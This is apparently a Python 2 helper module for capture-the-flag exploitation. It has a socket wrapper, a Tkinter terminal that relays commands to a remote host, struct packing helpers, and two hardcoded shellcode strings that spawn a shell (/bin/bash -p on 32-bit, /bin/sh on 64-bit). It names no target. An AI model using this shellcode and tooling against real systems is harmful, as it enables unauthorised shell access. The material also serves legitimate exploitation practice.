#-*- coding: utf-8 -*-
import sys, telnetlib, time, socket, struct
from subprocess import Popen, PIPE
import Tkinter

tmp = None
class HarDToSock:
	def __init__(self, *args, **kwargs):
		self.magicValue = 1928
		if "DEBUG" in kwargs:
			self.host = "localhost"
			self.port = self.magicValue
		elif ( "host" in kwargs ) and ( "port" in kwargs ):
			self.host = kwargs["host"]
			self.port = kwargs["port"]
		else:
			print "[+] Failed in connecting"
			sys.exit()
		self.sock = socket.create_connection((self.host, self.port))

	def recv(self, **kwargs):
		if len(kwargs) == 0:
			return self.sock.recv(4096)
		elif "end" in kwargs:
			s = kwargs["end"]
			buf = ''
			while not buf.endswith(s):
				buf += self.sock.recv(1)
			return buf
		else:
			print "[+] Need a purpose to wait!"
			sys.exit()

	def send(self, payload):
		self.sock.send(payload)

	def sendln(self, payload):
		self.sock.send(payload + "\n")

	class Terminal(Tkinter.Frame):
		def Enter_pressed(self):
			input_get = self.input.get("1.0", Tkinter.END)
			if input_get.split('\n')[-2] == 'exit':
				sys.exit()
			if ( tmp != None ) and ( input_get.split('\n')[-2] ):
				tmp.sendln(input_get.split('\n')[-2])
				self.output.insert(Tkinter.INSERT, tmp.recv())
				self.output.see(Tkinter.END)

		def __init__(self, parent, *args, **kwargs):
			Tkinter.Frame.__init__(self, parent, *args, **kwargs)
			self.parent = parent

			self.label = Tkinter.Label(self, text="Nothing is impossible\nImpossible says its self \"I\'m possible\"")
			self.interact = Tkinter.Frame(self)
			self.input = Tkinter.Text(self.interact, width=37, height=10)
			self.input.bind("<Return>", lambda x: self.Enter_pressed())
			self.input.focus_set()
			self.output = Tkinter.Text(self.interact, width=37, height=10)

			self.label.pack()
			self.interact.pack()
			self.input.grid(row=0, column=0)
			self.output.grid(row=0, column=1)

	def hardtopwn(self):
		global tmp
		print "[+] Keep calm and try harder"
		root = Tkinter.Tk()
		root.geometry("600x200")
		root.resizable(width=False, height=False)
		root.title("Terminal")
		tmp = self
		HarDToSock.Terminal(root).pack(side="top", fill="both", expand=True)
		root.mainloop()


def p32(number):
	return struct.pack('<I', number)

def u32(s):
	return struct.unpack('<I', s)[0]

def p64(number):
	return struct.pack('<Q', number)

def u64(s):
	return struct.unpack('<Q', s)[0]

def log(s):
	print "[+] ", s

def shcode32():
	return "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x31\xc9\xcd\x80"

def shcode64():
	return "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"